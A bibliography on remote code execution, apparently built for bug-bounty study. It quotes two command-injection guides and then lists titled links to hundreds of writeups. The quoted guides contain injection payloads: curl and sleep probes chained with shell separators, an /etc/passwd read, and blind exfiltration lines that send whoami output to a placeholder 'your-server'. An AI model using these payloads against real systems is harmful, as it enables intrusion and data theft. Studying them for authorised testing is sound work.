---
title: "RCE blogs index — bibliography: command-injection guides (byte-quoted), community writeup corpus (title-linked, curated 612 of 643), modern hardening-era cases"
type: bibliography
built: "2026-11-05"
byte_quoted_sources: 2 (bugbountyhunter.com command-injection guide + HackerOne Jobert blog, fetched live 2026-11-04; both plain-curl-clean)
title_linked_sources: 612 curated of 643 raw matches (lane filter; archive-mirror duplicates dropped)
body_fetched_blog_sources: 2 ok · 0 failed
---

# Blogs Index — RCE

Quote rule (vault-wide): byte-true quotes only from sources actually fetched this build.
Everything else is title + link, marked nothing (§2 is a title-linked corpus, never quoted).
Links are regenerated mechanically from the saved index, never hand-typed.

Curation rule for §2: kept entries whose **lane** matches the class modules (command
injection, deserialization, template injection, code-injection/eval, panels, CVE research,
gadget/ecosystem, stories); titles whose technique names another class as the **originator**
("SSRF to RCE", "LFI to RCE", "File Upload to RCE"…) live in §2.6 as chain bibliography —
the corpus doctrine: RCE modules teach the execution primitives from their own lane.

## 1. Fetched and byte-quoted: two command-injection guides

BugBountyHunter retains a `command_injection` type page (verified 2026-11-04; the 2026-10-28
`code` type page is gone — taxonomy drift recorded in source-index §4). §1a is that page.
§1b is HackerOne's own how-to by Jobert (the GitLab RCE author) — dated July 7, 2017,
inside the mirror era. Both fetched live 2026-11-04 via plain curl (no Cloudflare).

### 1a. BugBountyHunter — "Learning about Command Injection" (fetched 2026-11-04)

URL: `https://www.bugbountyhunter.com/vulnerability/?type=command_injection`

**The class frame, verbatim:**

> Command Injection is one of the highest-paying bug classes on bug bounty programs and for
> very good reason as sometimes it can enable an attacker full control of the target system
> and allows them to code directly on these systems. Command Injection is when the web
> application will execute

> your input

> via an operating system command. To explain simply, it'll take your command and execute it.

**The test surface, verbatim:**

> Honestly, you can literally test every single parameter you find for command injection.
> Bug bounty programs are usually blackbox testing meaning you have

> no idea what the code is doing behind the scenes

> as it isn't open source. So with that in mind, and with viewing some common payloads, where
> can you go wrong with testing each parameter? You start with having no idea what the
> parameter is doing bu you can find out by

> testing

> it.

**The payload list, verbatim (page format preserved):**

> | curl https://www.yoursite.com/
> || curl https://www.yoursite.com/
> & curl https://www.yoursite.com/
> ; curl https://www.yoursite.com/
> && curl https://www.yoursite.com/
> || sleep 15
> | sleep 15
> ; sleep 15
> & sleep 15
> && phpinfo()
> `ping yoursite.com`
> ; curl https://www.yoursite.com/
> %0a curl https://www.yoursite.com/ %0a
> {{ get_user_file("/etc/passwd") }}
> {${sleep(10)}}

**The zseano tip, verbatim:**

> Tip from @zseano
> Add a sleep command injection to every parameter & monitor the response time for each.
> Delayed response? Time to investigate for a potential vulnerability!

**The embedded references, verbatim:**

> For a full payload list and more information check out the useful payload list as well as
> https://github.com/payloadbox/command-injection-payload-list

> A really good writeup of how to use Burp to test for command injection can be found here:
> https://support.portswigger.net/customer/portal/articles/2590661-using-burp-to-test-for-os-command-injection-vulnerabilities

Note (sic): "Any parameter can be vulnerable." heads the page; the same page lists the two
SSTI-flavored probes (`{{…}}`, `{${…}}`) inside the command-injection payload list — the
class boundary smudge the corpus itself shows in module 02.

### 1b. HackerOne blog — "How To: Command Injections" (Jobert, July 7, 2017)

URL: `https://www.hackerone.com/blog/how-to-command-injections` (fetched live 2026-11-04)

**The class distinction, verbatim (also quoted in module 01):**

> Before diving into command injections, let’s get something out of the way: a command
> injection is not the same as a remote code execution (RCE). The difference is that with an
> RCE, actual programming code is executed, whereas with a command injection, it’s an (OS)
> command being executed. In terms of possible impact, this is a minor difference, but the
> key difference is in how you find and exploit them.

**The timing oracle, verbatim:**

> One of the best ways to detect a first-order command injection vulnerability is trying to
> execute a

> sleep

> command and determine if the execution time increases. To start with this, let’s establish
> a time baseline for the

> ping.rb

> script:

**The false-positive discipline, verbatim:**

> The script will now execute the command

> ping -c 4 8.8.8.8 && sleep 5

> . Notice the execution time again: it jumped from ~3 seconds to ~8 seconds, which is an
> increase of exactly 5 seconds. There can still be unexpected delays on the internet, so
> it’s important to repeat the injection and play with the amount of seconds to make sure
> it’s not a false positive.

**The substitution notations, verbatim (payload pair from the article):**

> time ruby ping.rb '8.8.8.8`sleep 5`'

> time ruby ping.rb '8.8.8.8$(sleep 5)'

> This is a different notation for command substitution. This may be useful when backticks
> are filtered or encoded. When using command substitution to look for command injections,
> make sure to test both notations to avoid true-negatives in case the payload is already
> being substituted (see last example in table above).

**The generic/blind split, verbatim (also quoted in module 01):**

> To exploit the vulnerability for evidence is to determine whether it’s a

> generic

> or

> blind

> command injection. The difference between the two, is that a

> blind

> command injection doesn’t return the output of the command in the response. A

> generic

> command injection would return the output of the executes command(s) in the response. The

> sleep

> command is often a good proof of concept for either flavor. However, if you need more
> proof, execute

> id

> ,

> hostname

> ,

> or

> whoami

> and use the output as additional proof. The server’s hostname is useful to determine how
> many servers are affected and help the vendor to get a sense of impact faster.

**The harmlessness rule, verbatim:**

> Important

> : needless to say, most companies don’t appreciate you snooping around on their systems.
> Before exploiting the vulnerability to pivot into something else, ask permission to the
> company. In nearly all situations proving that executing arbitrary but harmless commands
> like

> sleep

> ,

> id

> ,

> hostname

> or

> whoami

> is enough to proof impact to the affected company.

**The blind exfiltration ladder, verbatim (from the blind section):**

> whoami | curl http://your-server -d @-
> wget http://your-server/$(whoami)
> export C=whoami | ssh user@your-server
> (setup the user account on your-server to authenticate without a password and log every command being executed)

**The out-of-band-hostile fallback, verbatim:**

> Even though the

> server-online.rb

> script doesn’t output the result of the

> hostname

> command, the output can be sent to a remote server and obtained by an attacker. In some
> cases, outbound TCP and UDP connections are blocked. It’s still possible to extract the
> output in that case, we just have to do a little bit more work.

**The time-based extraction trick, verbatim (close of the article):**

> The trick here is to pass the result of a command to the

> sleep

> command. Here’s an example:

> sleep $(hostname | cut -c 1 | tr a 5)

> . Let’s analyze this for a moment.

Corpus pairing: the generic/blind split and the timing oracle are the operational core of
module 01 — RCE-73567 (Shopify `$(sleep 20)` proof) and RCE-214022 (Discourse backticks in
gzip) run exactly this playbook one era later; RCE-29480's IRC channel injection is the
argument-position variant.


## 2. Community writeup corpus (title-linked, curated)

Raw match pool: 643 writeups from the bugbountyhunting.com index (7,103 entries) matching
RCE-class arms. Curated to 612 by lane. Sections below are title-linked listings — never
quoted.

### 2.1 OS command injection

direct command / OS-execution titles — 54 entries.

- [Beyond the wall: command injection still alive.](https://a-constant.medium.com/beyond-the-wall-command-injection-still-alive-577a898df0b5)
- [Blind OS Command Injection](https://medium.com/@ashikbhaskar94/blind-os-command-injection-87910f0d2276)
- [Command Injection Through BLH](https://medium.com/@trapp3rhat/command-injection-through-blh-3c32614bb395)
- [Story of my Biggest Bounty ever : Command Execution on Jenkin](https://medium.com/@janijay007/story-of-my-biggest-bounty-evecommand-execution-on-jenkin-a73f5242b1e2)
- [Command Injection PoC](https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d)
- [Digging in to SCP Command Injection](https://dylankatz.com/digging-in-to-scp-command-injection/)
- [Evernote For Windows Read Local File and Command Execute Vulnerabilities](https://paper.seebug.org/737/)
- [Unauthenticated RSFTP to Command Injection](http://codegrazer.com/blog/rsftp-to-command-injection.html#.W-Cijl14IJM.twitter)
- [#BugBounty — From finding Jenkins instance to Command Execution.Secure your Jenkins Instance!](https://medium.com/@logicbomb_1/bugbounty-from-finding-jenkins-instance-to-command-execution-secure-your-jenkins-instance-9bd1e75c2288)
- [LFI to Command Execution: Deutche Telekom Bug Bounty](https://medium.com/@maxon3/lfi-to-command-execution-deutche-telekom-bug-bounty-6fe0de7df7a6)
- [Command Injection Without Spaces](https://www.betterhacker.com/2016/10/command-injection-without-spaces.html)
- [Command injection which got me “6000$” from #Google](http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html)
- [Git-Syncing into Trouble: Exploring Command Injection Flaws in Kubernetes](https://www.akamai.com/blog/security-research/2024/aug/2024-august-kubernetes-gitsync-command-injection-defcon)
- [CVE-2024-2448: Authenticated Command Injection In Progress Kemp LoadMaster](https://rhinosecuritylabs.com/research/cve-2024-2448-kemp-loadmaster/)
- [CVE-2024-1212: Unauthenticated Command Injection In Progress Kemp LoadMaster](https://rhinosecuritylabs.com/research/cve-2024-1212unauthenticated-command-injection-in-progress-kemp-loadmaster/)
- [SSD Advisory – Zyxel VPN Series Pre-auth Remote Command Execution](https://ssd-disclosure.com/ssd-advisory-zyxel-vpn-series-pre-auth-remote-command-execution/)
- [OS Command Injection in cPH2 Charging Station <2.0.0 (CVE-2023-46359 and CVE-2023-46360)](https://www.offensity.com/en/blog/os-command-injection-in-cph2-charging-station-200-cve-2023-46359-and-cve-2023-46360/)
- [CVE-2023-37927 & CVE-2023-37928 - Multiple post-auth blind OS command and Python code injection vulnerabilities in Zyxel’s NAS326 devices](https://bugprove.com/knowledge-hub/cve-2023-37927-and-cve-2023-37928-multiple-post-auth-blind-os-command-and-python-code-injection-vulnerabilities-in-zyxel-s-nas-326-devices/)
- [CVE-2023-4473 & CVE-2023-4474 - Authentication bypass and multiple blind OS command injection vulnerabilities in Zyxel’s NAS326 devices](https://bugprove.com/knowledge-hub/cve-2023-4473-and-cve-2023-4474-authentication-bypass-and-multiple-blind-os-command-injection-vulnerabilities-in-zyxel-s-nas-326-devices/)
- [Uncovering a Command Injection, $2400 Bounty](https://blog.voorivex.team/uncovering-a-command-injection-2400-bounty)
- [[CVE-2023–38743] ManageEngine ADManager Command Injection](https://petrusviet.medium.com/cve-2023-38743-manageengine-admanager-command-injection-6afccbb196fe)
- [Can't Be Contained: Finding a Command Injection Vulnerability in Kubernetes](https://www.akamai.com/blog/security-research/kubernetes-critical-vulnerability-command-injection)
- [Blind OS Command Injection via Activation Request](https://www.zerodayinitiative.com/blog/2023/5/17/cve-2023-2086920870-exploiting-vmware-workstation-at-pwn2own-vancouver)
- [Unauthenticated Remote Command Execution in Multiple WAGO Products](https://onekey.com/blog/security-advisory-wago-unauthenticated-remote-command-execution/)
- [Azure Devops CICD Pipelines - Command Injection With Parameters, Variables And A Discussion On Runner Hijacking](https://pulsesecurity.co.nz/advisories/Azure-Devops-Command-Injection)
- [The story of how I was able to chain SSRF with Command Injection Vulnerability](https://medium.com/@rajqureshi07/the-story-of-how-i-was-able-to-chain-ssrf-with-command-injection-vulnerability-ef31feb30ea9)
- [CS-Cart PDF Plugin Unauthenticated Command Injection](https://starlabs.sg/blog/2023/03-cs-cart-pdf-plugin-unauthenticated-command-injection/)
- [The Tale of a Command Injection by Changing the Logo](https://medium.com/@omidxrz/command-injection-by-changing-the-logo-2d730887ab6c)
- [Memcached Command Injections at Pylibmc](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/)
- [Remote Command Execution in binwalk](https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/)
- [Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)
- [Puckungfu: A NETGEAR WAN Command Injection](https://research.nccgroup.com/2022/12/22/puckungfu-a-netgear-wan-command-injection/)
- [Command Injection in Asus M25 NAS](https://onekey.com/blog/security-advisory-asus-m25-nas-vulnerability/)
- [A Real World Example Of Classic Remote Command Execution (RCE)](https://bhashit.in/?p=117)
- [Remote Command Execution in a Bank Server](https://medium.com/@win3zz/remote-command-execution-in-a-bank-server-b213f9f42afe)
- [Orange Arbitrary Command Execution](https://omar0x01.medium.com/orange-arbitrary-command-execution-75ba7f283d53)
- [Breaking Bitbucket: Pre Auth Remote Command Execution (CVE-2022-36804)](https://blog.assetnote.io/2022/09/14/rce-in-bitbucket-server/)
- [Command Injection in the GitHub Pages Build Pipeline](https://blog.nietaanraken.nl/posts/github-pages-command-injection/)
- [Blind command injection](https://bergee.it/blog/blind-command-injection/)
- [Google Cloud Shell - Command Injection](https://bugra.ninja/posts/cloudshell-command-injection/)
- [Advisory: Cisco Small Business RV Series Routers Web Filter Database Update Command Injection Vulnerability](https://onekey.com/blog/advisory-cisco-small-business-rv-series-routers-web-filter-database-update-command-injection-vulnerability/)
- [QNAP Poisoned XML Command Injection (Silently Patched)](https://www.rapid7.com/blog/post/2022/08/04/qnap-poisoned-xml-command-injection-silently-patched/)
- [SQL injection to Remote Command Execution (RCE)](https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a75292d1d)
- [Finding bugs to trigger Unauthenticated Command Injection in a NETGEAR router (PSV-2022–0044)](https://flattsecurity.medium.com/finding-bugs-to-trigger-unauthenticated-command-injection-in-a-netgear-router-psv-2022-0044-2b394fb9edc)
- [Command Injection in Google Cloud Shell](https://docs.google.com/document/d/1-TTCS6fS6kvFUkoJmX4Udr-czQ79lSUVXiWsiAED_bs/edit)
- [How I found Command Injection via Obsolete PHPThumb](https://sushant-kamble.medium.com/how-i-found-command-injection-via-obsolete-phpthumb-p1-vulnerability-e4811248ce12)
- [Remote Command Execution in Visual Studio Code Remote Development Extension](https://www.shielder.it/advisories/remote-command-execution-in-visual-studio-code-remote-development-extension/)
- [PowerShell script, Unicode quotes and ウィンドウズ - a story of uncommon command injection](https://blog.stmcyber.com/powershell-unicode-quotes-and-command-injection/)
- [Blind Command Injection - It hurts](https://shahjerry33.medium.com/blind-command-injection-it-hurts-9f396c1f63f2)
- [Discoure themes OS Command Injection](https://0day.click/recipe/2021-04-18-discourse-themes/)
- [Advisory: Cisco RV34X Series – Authentication Bypass and Remote Command Execution](https://onekey.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/)
- [An unknown Linux secret that turned SSRF to OS Command injection](https://secureitmania.medium.com/an-unknown-linux-secret-that-turned-ssrf-to-os-command-injection-6fe2f4edc202)
- [Analysing Crash Messages To Achieve Blind Root Command Injection](https://www.shawarkhan.com/2021/01/analysing-crash-messages-to-achieve.html)
- [Unauthenticated Command Injection Vulnerability in VMware NSX SD-WAN by VeloCloud](https://www.cyberonesecurity.com/blog/unauthenticated-command-injection-vulnerability-in-vmware-nsx-sd-wan-by-velocloud)

### 2.2 Unsafe deserialization

unserialize / pickle / marshal / Jackson-grade titles — 33 entries.

- [How i found a 1500$ worth Deserialization vulnerability](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
- [Attacking PowerShell CLIXML Deserialization](https://www.truesec.com/hub/blog/attacking-powershell-clixml-deserialization)
- [Why nested deserialization is harmful: Magento XXE (CVE-2024-34102)](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102)
- [R-bitrary Code Execution: Vulnerability In R’s Deserialization (CVE-2024-27322)](https://hiddenlayer.com/research/r-bitrary-code-execution/)
- [Java Deserialization Tricks](https://www.synacktiv.com/en/publications/java-deserialization-tricks.html)
- [Discovering Deserialization Gadget Chains in Rubyland](https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/)
- [PHP deserialization attacks and a new gadget chain in Laravel](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
- [Relution Remote Code Execution via Java Deserialization Vulnerability](https://www.praetorian.com/blog/relution-remote-code-execution-java-deserialization-vulnerability/)
- [Gambio 4.9.2.0 - Insecure Deserialization](https://herolab.usd.de/security-advisories/usd-2023-0046/)
- [CVE-2023–50220 — Inductive Automation Ignition XML Deserialization to RCE](https://petrusviet.medium.com/cve-2023-50220-inductive-automation-ignition-xml-deserialization-to-rce-7b395412c6cf)
- [Finding Deserialization Bugs In The Solarwind Platform](https://www.zerodayinitiative.com/blog/2023/9/21/finding-deserialization-bugs-in-the-solarwind-platform)
- [Phar Deserialization (CVE-2023-28115 Patch Bypass)](https://www.synacktiv.com/advisories/phar-deserialization-cve-2023-28115-patch-bypass)
- [CVE-2023-34040 Spring Kafka Deserialization Remote Code Execution](https://pyn3rd.github.io/2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution/)
- [Identifying and Exploiting Unsafe Deserialization in Ruby](https://medium.com/@plenumlab/identifying-and-exploiting-unsafe-deserialization-in-ruby-97c7cbd6c05d)
- [Microsoft Exchange Powershell Remoting Deserialization leading to RCE (CVE-2023-21707)](https://starlabs.sg/blog/2023/04-microsoft-exchange-powershell-remoting-deserialization-leading-to-rce-cve-2023-21707/)
- [Weblogic CVE-2023-21931 vulnerability exploration technique: post-deserialization exploitation](https://github.com/gobysec/Weblogic/blob/main/Research%20on%20WebLogic%20After-Deserialization.md)
- [WordPress BuddyForms Plugin — Unauthenticated Insecure Deserialization (CVE-2023–26326)](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8)
- [Pwn2Owning Two Hosts At The Same Time: Abusing Inductive Automation Ignition’s Custom Deserialization](https://www.zerodayinitiative.com/blog/2023/2/6/pwn2owning-two-hosts-at-the-same-time-abusing-inductive-automation-ignitions-custom-deserialization)
- [Unserializable, But Unreachable: Remote Code Execution On vBulletin](https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable)
- [VMware vCenter Server Platform Services Controller Unsafe Deserialization vulnerability](https://talosintelligence.com/vulnerability_reports/TALOS-2022-1587)
- [SSD Advisory – Microsoft SharePoint Server WizardConnectToDataStep4 Deserialization Of Untrusted Data RCE](https://ssd-disclosure.com/ssd-advisory-microsoft-sharepoint-server-wizardconnecttodatastep4-deserialization-of-untrusted-data-rce/)
- [New Wine in Old Bottle - Microsoft Sharepoint Post-Auth Deserialization RCE (CVE-2022-29108)](https://www.starlabs.sg/blog/2022/05-new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/)
- [CVE-2022-26133 - Bitbucket Data Center - Java Deserialization Vulnerability](https://github.com/snowyyowl/writeups/tree/main/CVE-2022-26133)
- [Ruby Deserialization - Gadget on Rails](https://httpvoid.com/Ruby-Deserialization-Gadget-On-Rails.md)
- [Searching for Deserialization Protection Bypasses in Microsoft Exchange (CVE-2022–21969)](https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d)
- [Remote Deserialization Bug in Microsoft's RDP Client through Smart Card Extension (CVE-2021-38666)](https://thalium.github.io/blog/posts/deserialization-bug-through-rdp-smart-card-extension/)
- [Shells And SOAP: Websphere Deserialization To RCE](https://web.archive.org/web/20221128060608/https://wya.pl/2021/10/18/shells-and-soap-websphere-deserialization-to-rce/)
- [Detecting Jackson deserialization vulnerabilities with CodeQL](https://blog.gypsyengineer.com/en/security/detecting-jackson-deserialization-vulnerabilities-with-codeql.html)
- [Remote code execution through unsafe unserialize in PHP](https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/)
- [CVE-2021-27076: A Replay-style Deserialization Attack Against Sharepoint](https://www.thezdi.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint)
- [Ruby 2.x Universal RCE Deserialization Gadget Chain](https://www.elttam.com/blog/ruby-deserialization/)
- [Adobe ColdFusion Deserialization RCE (CVE-2017-11283, CVE-2017-11284)](https://nickbloor.co.uk/2017/10/13/adobe-coldfusion-deserialization-rce-cve-2017-11283-cve-2017-11238/)
- [Deserialization in Perl v5.8](https://www.agarri.fr/blog/archives/2016/02/06/deserialization_in_perl_v5_8/index.html)

### 2.3 Server-side template injection

Jinja / Freemarker / Velocity / Handlebars / server-side template titles — 32 entries.

- [SSTI in Google Maps](https://www.ehpus.com/post/ssti-in-google-maps)
- [SSTI to Local File Read](https://www.r29k.com/articles/bb/ssti)
- [RCE via Server-Side Template Injection](https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae)
- [Reflected XSS on Microsoft.com via Angular Js template injection](https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8)
- [Microsoft Apache Solr RCE Velocity Template | Bug Bounty POC](https://blog.securitybreached.org/2020/03/31/microsoft-rce-bugbounty/)
- [Limited freemarker ssti to arbitrary liql query and manage lithium cms](https://blog.mert.ninja/freemarker-ssti-on-lithium-cms/)
- [RCE with Flask Jinja Template Injection](https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870)
- [Handlebars template injection and RCE in a Shopify app](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
- [Frappé Technologies ERPNext Server Side Template Injection](https://medium.com/bugbountywriteup/frapp%C3%A9-technologies-erpnext-server-side-template-injection-74e1c95ec872)
- [Exploitation of Server Side Template Injection with Craft CMS plugin SEOmatic <=3.1.3 [CVE-2018-14716]](http://ha.cker.info/exploitation-of-server-side-template-injection-with-craft-cms-plguin-seomatic/)
- [Reflected XSS + Possible Server Side Template Injection in HubSpot CMS ( All Websites Uses HubSpot was affected ) ](https://www.mohamedharon.com/2018/01/reflected-xss-possible-server-side.html)
- [Reflected XSS via AngularJS Template Injection](https://blog.ibrahimdraidia.com/xss-via-angularjs-template-injection_hostinger/)
- [RCE Vulnerabilite in Yahoo Subdomain! ( Yahoo! RCE via Spring Engine SSTI ) By tghawkins](https://www.mohamedharon.com/2018/01/rce-vulnerabilite-in-yahoo-subdomain.html)
- [SSTI in Bug Bounty Program: The Time I Played with Handlebars and Broke Stuff](https://medium.com/@ali.zamini/ssti-in-bug-bounty-program-the-time-i-played-with-handlebars-and-broke-stuff-7dc1f9834a3d)
- [WPML Multilingual CMS Authenticated Contributor+ Remote Code Execution (RCE) via Twig Server-Side Template Injection (SSTI)](https://sec.stealthcopter.com/wpml-rce-via-twig-ssti/)
- [Server-side Template Injection Leading to RCE on Google VRP](https://neupanemizzle.medium.com/server-side-template-injection-leading-to-rce-on-google-vrp-75f0a4bc6ebc)
- [SSO Gadgets II: Unauthenticated Client-Side Template Injection to Account Takeover using SSO Gadget Chain](https://security.lauritz-holtmann.de/post/csti-xss-sso-gadget-chain/)
- [Popping Tags: Exploiting Template Injections in PRTG Network Monitor](https://skylightcyber.com/2023/04/18/popping-tags/)
- [(CVE-2023-2017) Shopware 6 Server-side Template Injection (SSTI) via Twig Security Extension](https://starlabs.sg/advisories/23/23-2017/)
- [CVE-2023-1877 / RCE with Server-Side Template Injection in Microweber](https://cupc4k3.medium.com/cve-2023-1877-rce-with-server-side-template-injection-in-microweber-89da6a0e2603)
- [SSTI leads to RCE on PyroCMS](https://cupc4k3.lol/ssti-leads-to-rce-on-pyrocms-7515be27c811)
- [[CVE-2023-22855] Kardex MLOG - Insecure path join to RCE via SSTI](https://hesec.de/posts/cve-2023-22855/)
- [Doing it the researcher’s way: How I Managed to Get SSTI (Server Side Template Injection) which lead to arbitrary file reading on One of the Leading Payment Systems in Asia](https://medium.com/@jazdprince/doing-it-the-researchers-way-how-i-managed-to-get-ssti-server-side-template-injection-which-66b239ca0104)
- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass](https://www.pmnh.site/post/writeup_spring_el_waf_bypass/)
- [Stored XSS in Nvidia via Angular JS template injection](https://xthemo.medium.com/stored-xss-at-nvidia-via-angular-js-template-injection-3c9793218860)
- [Escalating SSTI to Reflected XSS using curly braces {}](https://sagarsajeev.medium.com/escalating-ssti-to-reflected-xss-using-curly-braces-825685bd93ec)
- [AngularJS Client-Side Template Injection: The orderBy Filter.](https://medium.com/@xJay/angularjs-client-side-template-injection-the-orderby-filter-20002ca2a0e8)
- [XSS via Angular Template Injection](https://bergee.it/blog/xss-via-angular-template-injection/)
- [EJS, Server side template injection RCE (CVE-2022-29078) - writeup](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
- [iTop – Template Injection inside customer Portal](https://markus-krell.de/itop-template-injection-inside-customer-portal/)
- [Leveraging Template injection to takeover an account.](https://infosecwriteups.com/leveraging-template-injection-to-takeover-an-account-1dba7c4ae315)
- [XSS without HTML: Client-Side Template Injection with AngularJS](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)

### 2.4 Code injection / eval primitives

code-injection and eval-primitive titles — 10 entries.

- [[demo.paypal.com] Node.js code injection (RCE)](https://artsploit.blogspot.com/)
- [Code Injection to RCE with .NET](https://blog.stratumsecurity.com/2024/04/29/code-injection-to-rce-with-net/)
- [CVE-2023-5372 - Post-auth blind Python code injection vulnerabilities in Zyxel’s NAS326 and NAS542 devices](https://bugprove.com/knowledge-hub/cve-2023-5372-post-auth-blind-python-code-injection-vulnerabilities-in-zyxel-s-nas-326-and-nas-542-devices/)
- [CVE-2023-35150: Arbitrary Code Injection In XWiki.Org XWiki](https://www.zerodayinitiative.com/blog/2023/8/22/cve-2023-35150-arbitrary-code-injection-in-xwikiorg-xwiki)
- [Jasper Reports Library Code Injection](https://insinuator.net/2023/06/jasper-reports-library-code-injection/)
- [Code Injection via Python Sandbox Escape — how I got a shell inside a network.](https://medium.com/@mares.viktor/code-injection-via-python-sandbox-escape-how-i-got-a-shell-inside-a-network-c977c35a82de)
- [CVE-2022-3236: Sophos Firewall User Portal and Web Admin Code Injection](https://www.zerodayinitiative.com/blog/2022/10/19/cve-2022-3236-sophos-firewall-user-portal-and-web-admin-code-injection)
- [Code Injection and SQLi in WP ALL Export Pro](https://payatu.com/blog/p3n7a90n/wp-all-export-pro)
- [Exploiting CVE-2022-24816: A Code Injection In The Jt-jiffle Extension Of Geoserver](https://www.synacktiv.com/en/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver.html)
- [RCE By Code Injection | Perl Reverse Shell](https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10)

### 2.5a Exposed panels & devops consoles

36 entries.

- [Misconfigured WordPress takeover to Remote Code Execution](https://smaranchand.com.np/2020/04/misconfigured-wordpress-takeover-to-remote-code-execution/)
- [RCE via Apache Struts2 - Still out there.](https://medium.com/@abhishake100/rce-via-apache-struts2-still-out-there-b15ce205aa21)
- [How to get RCE on AEM instance without Java knowledge](https://medium.com/@byq/how-to-get-rce-on-aem-instance-without-java-knowledge-a995ceab0a83)
- [Exposed Jenkins to RCE on 8 Adobe Experience Managers](https://www.corben.io/jenkins-to-full-pwnage/)
- [Private bug bounty \(,\)$ USD: “RCE as root on Marathon-Mesos instance”](https://omespino.com/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/)
- [WordPress Design Flaw Leads to WooCommerce RCE](https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/)
- [RCE Unsecure Jenkins Instance | Bug Bounty POC](https://blog.securitybreached.org/2018/09/07/rce-jenkins-instance-dosomething-org-bug-bounty-poc/)
- [Back To School - Exploiting A Remote Code Execution Vulnerability In Moodle](https://blog.redteam-pentesting.de/2024/moodle-rce/)
- [Hidden in Plain Sight: Uncovering RCE on a Forgotten Axis2 Instance](https://medium.com/@domenicoveneziano/hidden-in-plain-sight-uncovering-rce-on-a-forgotten-axis2-instance-86ddc91f1415)
- [$4,998 Bounty Awarded and 100,000 WordPress Sites Protected Against Unauthenticated Remote Code Execution Vulnerability Patched in GiveWP WordPress Plugin](https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/)
- [MITMing the Xbox 360 Dashboard for Fun and RCE](https://landaire.net/mitming-the-xbox-360-dashboard-for-rce-and-fun/)
- [3 ways to get Remote Code Execution in Kafka UI](https://github.blog/security/vulnerability-research/3-ways-to-get-remote-code-execution-in-kafka-ui/)
- [Getting Unauthenticated Remote Code Execution On The Logsign Unified Secops Platform](https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform)
- [From a GLPI patch bypass to RCE](https://sensepost.com/blog/2024/from-a-glpi-patch-bypass-to-rce/)
- [Finding A RCE Gadget Chain In WordPress Core](https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/)
- [RCE on Application’s Tracking Admin Panel](https://infosecwriteups.com/rce-on-applications-tracking-admin-panel-fdc7e8320366)
- [Adobe ColdFusion Pre-Auth RCE(s)](https://blog.projectdiscovery.io/adobe-coldfusion-rce/)
- [RCE In GitLab's CLI Tool](http://blog.takemyhand.xyz/2023/07/remote-code-execution-in-gitlabs-cli.html)
- [Apache Solr 8.3.1 RCE from exposed administration interface](https://blog.scrt.ch/2023/05/01/solr-rce-from-exposed-administration-interface/)
- [CorePlague: Severe Vulnerabilities in Jenkins Server Lead to RCE](https://blog.aquasec.com/jenkins-server-vulnerabilities)
- [Cacti: Unauthenticated Remote Code Execution](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/)
- [RCE on admin panel of web3 website](https://medium.com/@vamshivaran110/rce-on-admin-panel-of-web3-website-2d0acf34d6ea)
- [RCE on Apache Struts 2.5.30](https://mc0wn.blogspot.com/2022/11/rce-on-apache-struts-2530.html)
- [RCE docker api, but …](https://medium.com/@nanwinata/rce-docker-api-but-11ff70825935)
- [Visual Studio Code Jupyter Notebook RCE](https://blog.doyensec.com/2022/10/27/jupytervscode.html)
- [Remote Code Execution by Abusing Apache Spark SQL](https://blog.stratumsecurity.com/2022/10/24/abusing-apache-spark-sql-to-get-code-execution/)
- [Securing Developer Tools: OneDev Remote Code Execution](https://blog.sonarsource.com/onedev-remote-code-execution/)
- [Microsoft Dynamics Container Sandbox RCE via Unauthenticated Docker Remote API 20,000$ Bounty](https://hencohen10.medium.com/microsoft-dynamics-container-sandbox-rce-via-unauthenticated-docker-remote-api-20-000-bounty-7f726340a93b)
- [Unauthenticated Remote Code Execution in Cisco Nexus Dashboard Fabric Controller (formerly DCNM)](https://github.com/pedrib/PoC/blob/master/advisories/Cisco/DCNMPwn.md)
